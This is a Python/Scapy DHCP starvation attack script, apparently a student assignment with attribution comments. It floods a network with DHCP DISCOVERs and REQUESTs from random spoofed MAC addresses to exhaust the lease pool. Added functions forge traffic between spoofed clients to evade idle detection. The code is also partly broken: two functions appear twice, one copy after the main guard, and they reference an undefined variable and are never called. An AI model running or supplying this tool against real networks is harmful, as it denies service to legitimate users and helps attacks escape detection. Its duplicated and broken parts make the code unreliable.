#!/usr/bin/env python3
# What I (omar) wrote:
# - Overall program structure and flow (threads: listener/attacker), counters,
#   bookkeeping lists/dicts, printing, timing, and shutdown handling.
# - Functions: rand_mac(), handle(), attacker(), listener(), stats().
# What was adapted from open sources (packet-building idioms; re-implemented by me):
# - Functions: make_discover(), make_request() follow canonical Scapy layering and options
#   shown in similar repos/discussions (links below).
# ChatGPT (AI) assistance:
# - ChatGPT helped with CLI handling (argument parsing and program orchestration in main())
#   and provided syntax/debugging suggestions on request on most of the functions I wrote.
# references:
# - https://github.com/peppelinux/pyDHCPStarvator
# - https://github.com/kamorin/DHCPig
# - https://github.com/Kurlee/DHCP-Starvation
# - https://github.com/yoelbassin/DHCP-starvation
# - https://stackoverflow.com/questions/25124500/sending-dhcp-discover-using-python-scapy
# - https://scapy.readthedocs.io/en/latest/api/scapy.layers.dhcp.html


from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp, sniff, mac2str
import random, time, threading, argparse, os, sys

# globals (keeps code short)
# AUTHOR: Omar : my globals/state + layout
iface="eth0"; quiet=False
xid_mac = {}
fake_macs = []
requested = []
sent = leases = 0
running = True

# AUTHOR: Omar (typical MAC generator pattern seen broadly; this is my version)
def rand_mac():
    m=[0x00,0x0c,0x29, random.randint(0,255), random.randint(0,255), random.randint(0,255)]
    mac=':'.join(f"{x:02x}" for x in m); fake_macs.append(mac); return mac

# ADAPTED_FROM (packet-building idiom matches open-source patterns; re-implemented by me):
# - pyDHCPStarvator / DHCPig / SO thread show Ether/IP/UDP/BOOTP/DHCP layering & mac2str usage.
# - I kept my own fields/order and extras (hostname, param_req_list), no verbatim paste.
def make_discover(mac):
    xid=random.randint(1,0xFFFFFFFF)
    pkt=(Ether(dst="ff:ff:ff:ff:ff:ff",src=mac)/
         IP(src="0.0.0.0",dst="255.255.255.255")/
         UDP(sport=68,dport=67)/
         BOOTP(chaddr=mac2str(mac),xid=xid,flags=0x8000)/
         DHCP(options=[("message-type","discover"),
                       ("hostname",f"victim-{random.randint(1000,9999)}"),
                       ("param_req_list",[1,3,6,15,28,51,58,59]),
                       "end"]))
    return pkt,xid

# ADAPTED_FROM (same rationale as make_discover: canonical REQUEST fields/options; my implementation)
def make_request(mac,ip,server,xid):
    return (Ether(dst="ff:ff:ff:ff:ff:ff",src=mac)/
            IP(src="0.0.0.0",dst="255.255.255.255")/
            UDP(sport=68,dport=67)/
            BOOTP(chaddr=mac2str(mac),xid=xid,flags=0x8000)/
            DHCP(options=[("message-type","request"),
                          ("requested_addr",ip),
                          ("server_id",server),
                          ("hostname",f"victim-{random.randint(1000,9999)}"),
                          ("param_req_list",[1,3,6,15,28,51,58,59]),
                          "end"]))

# Round 3 fxn: forge_unicast_pkt
# Authors: Omar Kaaki, Mostafa Jammoul
# Purpose: craft a unicast Ethernet/IP/UDP packet between two spoofed clients to simulate legit traffic.
# Reference (examples): pyDHCPStarvator (peppelinux) and DHCPig (kamorin); Scapy docs for packet layering.

def forge_unicast_pkt(src_mac, src_ip, dst_mac, dst_ip):
    pkt = (Ether(src=src_mac, dst=dst_mac)/
            IP(src=src_ip, dst=dst_ip)/
            UDP(sport=random.randint(1024,65535),dport=random.randint(1024,65535)))
    sendp(pkt, iface=iface, verbose=0)

# Round 3 fxn: interspoofed_comm
# Authors: Omar Kaaki, Mostafa Jammoul
# Purpose: periodically have spoofed clients send fake traffic between them to avoid idle detection.
# Reference (concept): advanced exhaustion tools that simulate client activity (pyDHCPStarvator, DHCPig).

def interspoofed_comm():
    while running:
        if len(leased_macs) >= 2:
            a,b = random.sample(leased_macs, 2)
            forge_unicast_pkt(a['mac'], a['ip'], b['mac'], b['ip'])
            if not quiet:
                print(f"[NOTIF] Fake Comms: {a['mac']}//{a['ip']} -> {b['mac']}//{b['ip']}")
            time.sleep(0.05)
            forge_unicast_pkt(b['mac'], b['ip'], a['mac'], a['ip'])
            if not quiet:
                print(f"[NOTIF] Fake Comms: {b['mac']}//{b['ip']} -> {a['mac']}//{a['ip']}")
        wait_t = random.random() + 1
        time.sleep(wait_t)

# AUTHOR: Omar : my handler logic (OFFER-REQUEST, ACK/NAK counters/prints)
# AI_ASSISTED: minor syntax/debug help (e.g., ensuring DHCP in p before indexing)
def handle(p):
    global leases
    if DHCP not in p: return
    for o in p[DHCP].options:
        if o[0]=="message-type":
            t=o[1]
            if t==2: # OFFER
                ip=p[BOOTP].yiaddr; srv=p[IP].src; xid=p[BOOTP].xid
                mac = xid_mac.pop(xid,None) or p[Ether].dst
                if not quiet: print(f"[+] OFFER {ip} from {srv} (xid={xid}, mac={mac})")
                sendp(make_request(mac,ip,srv,xid), iface=iface, verbose=0)
                requested.append(ip)
                return
            if t==5: # ACK
                ip=p[BOOTP].yiaddr; leases+=1
                if not quiet: print(f"[✓] Leased: {ip} (Total: {leases})")
                return
            if t==6: # NAK
                print("[!] NAK received - pool may be exhausted"); return

# AUTHOR: Omar :my attacker loop (MAC churn, send DISCOVER, simple pacing)
def attacker():
    global sent
    if not quiet: print(f"[*] Starting on {iface} - Ctrl+C to stop")
    while running:
        mac=rand_mac(); pkt,xid=make_discover(mac); xid_mac[xid]=mac
        sendp(pkt, iface=iface, verbose=0); sent+=1
        if not quiet and sent%10==0: print(f"[→] Sent {sent} DISCOVERs")
        # time.sleep(0.1) (round 0)

# AUTHOR: Omar: my sniffer; filter is standard from SO/Scapy docs
def listener():
    sniff(filter="udp and (port 67 or port 68)", prn=handle, iface=iface, store=0,
          stop_filter=lambda x: not running)

# AUTHOR: Omar : my summary printer
def stats():
    print("\n" + "="*40); print("STATS"); print("="*40)
    print(f"DISCOVERs sent: {sent}"); print(f"Successful leases: {leases}")
    print(f"Unique MACs: {len(fake_macs)}"); print(f"Unique IPs: {len(set(requested))}")
    if requested:
        try: print(f"IP Range: {min(requested)} - {max(requested)}")
        except: pass
    print("="*40)



# AI_ASSISTED: ChatGPT did CLI handling (argument parsing and main() orchestration).
# For rounds 1-2 (added interval and jitter), we reformatted the already-existing CLI parsing to include them. Also a small modification to attacker() time.sleep() argument.

def main():
    global iface, quiet, running
    p=argparse.ArgumentParser(); p.add_argument("-i","--interface",default="eth0")
    p.add_argument("-d","--duration",type=int); p.add_argument("-q","--quiet",action="store_true")
    args=p.parse_args(); iface=args.interface; quiet=args.quiet
    if os.geteuid()!=0: print("Run as root"); sys.exit(1)
    t1=threading.Thread(target=listener,daemon=True); t1.start()
    t2=threading.Thread(target=attacker,daemon=True); t2.start()
    try:
        if args.duration: time.sleep(args.duration)
        else:
            while True: time.sleep(1)
    except KeyboardInterrupt:
        if not quiet: print("\n[*] Stopping...")
    finally:
        running=False; time.sleep(1); stats()

if __name__=="__main__": main()

# NEW function: forge_unicast_pkt
# Authors: Omar Kaaki, Mostafa Jammoul
# Purpose: craft a unicast Ethernet/IP/UDP packet between two spoofed clients to simulate legit traffic.
# Reference (examples): pyDHCPStarvator (peppelinux) and DHCPig (kamorin); Scapy docs for packet layering.

def forge_unicast_pkt(src_mac, src_ip, dst_mac, dst_ip):
    pkt = (Ether(src=src_mac, dst=dst_mac)/
            IP(src=src_ip, dst=dst_ip)/
            UDP(sport=random.randint(1024,65535),dport=random.randint(1024,65535)))
    sendp(pkt, iface=iface, verbose=0)

# NEW function: interspoofed_comm
# Authors: Omar Kaaki, Mostafa Jammoul
# Purpose: periodically have spoofed clients send fake traffic between them to avoid idle detection by simple detectors.
# Reference (concept): advanced exhaustion tools that simulate client activity (pyDHCPStarvator, DHCPig).

def interspoofed_comm():
    while running:
        if len(leased_macs) >= 2:
            a,b = random.sample(leased_macs, 2)
            forge_unicast_pkt(a['mac'], a['ip'], b['mac'], b['ip'])
            if not quiet:
                print(f"[NOTIF] Fake Comms: {a['mac']}//{a['ip']} -> {b['mac']}//{b['ip']}")
            time.sleep(0.05)
            forge_unicast_pkt(b['mac'], b['ip'], a['mac'], a['ip'])
            if not quiet:
                print(f"[NOTIF] Fake Comms: {b['mac']}//{b['ip']} -> {a['mac']}//{a['ip']}")
        wait_t = random.random() + 1
        time.sleep(wait_t)
